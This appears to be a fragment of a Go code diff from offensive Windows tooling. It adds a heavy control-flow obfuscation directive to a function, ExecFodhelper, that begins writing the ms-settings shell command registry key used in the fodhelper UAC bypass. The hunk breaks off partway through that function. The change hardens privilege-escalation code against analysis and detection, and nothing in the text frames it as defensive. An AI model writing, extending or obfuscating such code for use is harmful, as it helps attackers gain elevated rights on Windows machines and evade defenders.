@@ -13,6 +13,7 @@ import (
 
 	"golang.org/x/sys/windows/registry"
 )
+//garble:controlflow flatten_passes=1 junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func ExecFodhelper(path string) error {
 	k, _, err := registry.CreateKey(registry.CURRENT_USER,
 		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
